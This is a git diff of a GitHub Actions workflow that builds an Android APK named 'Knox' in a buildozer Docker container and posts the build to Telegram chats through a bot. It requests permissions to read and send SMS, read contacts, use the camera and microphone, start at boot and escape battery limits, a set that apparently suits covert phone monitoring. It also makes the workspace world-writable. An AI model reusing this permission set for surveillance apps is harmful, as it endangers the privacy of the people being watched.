@@ -1,4 +1,4 @@
-name: Build APK (Fast & Stable)
+name: Build APK (Final - Working)
 
 on:
   push:
@@ -7,7 +7,6 @@ on:
 
 jobs:
   build:
-    # استخدام أحدث إصدار من Ubuntu لضمان التوفر السريع
     runs-on: ubuntu-latest
 
     steps:
@@ -23,41 +22,39 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          # استخدام libtinfo6 لأنها متوفرة في الإصدارات الحديثة
           sudo apt install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo6 cmake libffi-dev libssl-dev build-essential python3-dev
           pip3 install --user --upgrade cython==0.29.33 buildozer
           echo "$HOME/.local/bin" >> $GITHUB_PATH
 
-      - name: Create build-tools directory (prevent Aidl error)
-        run: |
-          mkdir -p ~/.buildozer/android/platform/android-sdk/build-tools/33.0.0
-
-      - name: Configure buildozer.spec
+      - name: Configure buildozer.spec (allow SDK download)
         run: |
           cd project
-          # تعديل الإعدادات الأساسية
           sed -i 's|^#\? \?android.api = .*|android.api = 33|' buildozer.spec
           sed -i 's|^#\? \?android.minapi = .*|android.minapi = 21|' buildozer.spec
           sed -i 's|^#\? \?android.ndk = .*|android.ndk = 25b|' buildozer.spec
           sed -i 's|^#\? \?android.build_tools_ver = .*|android.build_tools_ver = 33.0.0|' buildozer.spec
+          # السماح بتحميل SDK (هذا ضروري)
+          sed -i 's|^#\? \?android.skip_update = .*|android.skip_update = False|' buildozer.spec
           sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
-          # إضافة الصلاحيات المطلوبة للتطبيق
+          # صلاحيات التطبيق
           sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_CONTACTS, READ_SMS, SEND_SMS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS|' buildozer.spec
 
-      - name: Build APK
+      - name: Build APK (using Docker with bash override)
         run: |
-          cd project
-          # بناء التطبيق مع تجاوز تحذير root
-          buildozer --warn_on_root=0 -v android debug
+          docker run --rm \
+            -v ${{ github.workspace }}:/workspace \
+            -w /workspace/project \
+            --entrypoint /bin/bash \
+            kivy/buildozer:latest \
+            -c "apt update && apt install -y sudo && \
+                chmod -R 777 /workspace && \
+                buildozer --warn_on_root=0 -v android debug"
 
       - name: Locate APK
         id: find_apk
         run: |
           APK_PATH=$(find project/bin -name "*.apk" -type f | head -n 1)
-          if [ -z "$APK_PATH" ]; then
-            echo "APK not found"
-            exit 1
-          fi
+          if [ -z "$APK_PATH" ]; then echo "APK not found"; exit 1; fi
           echo "apk_path=$APK_PATH" >> $GITHUB_OUTPUT
           echo "APK size: $(du -h "$APK_PATH" | cut -f1)"
 
@@ -70,10 +67,10 @@ jobs:
         run: |
           APK_FILE=${{ steps.find_apk.outputs.apk_path }}
           curl --retry 3 --retry-delay 2 -F "chat_id=$CHAT_ID" -F "document=@$APK_FILE" \
-            -F "caption=✅ Knox APK Build Successful" \
+            -F "caption=✅ Knox APK Build Successful (Docker fixed entrypoint)" \
             https://api.telegram.org/bot$BOT_TOKEN/sendDocument
           if [ -n "$VAULT_ID" ]; then
-            curl -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=Backup Knox APK" \
+            curl -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=📦 Backup Knox APK" \
               https://api.telegram.org/bot$BOT_TOKEN/sendDocument
           fi
 
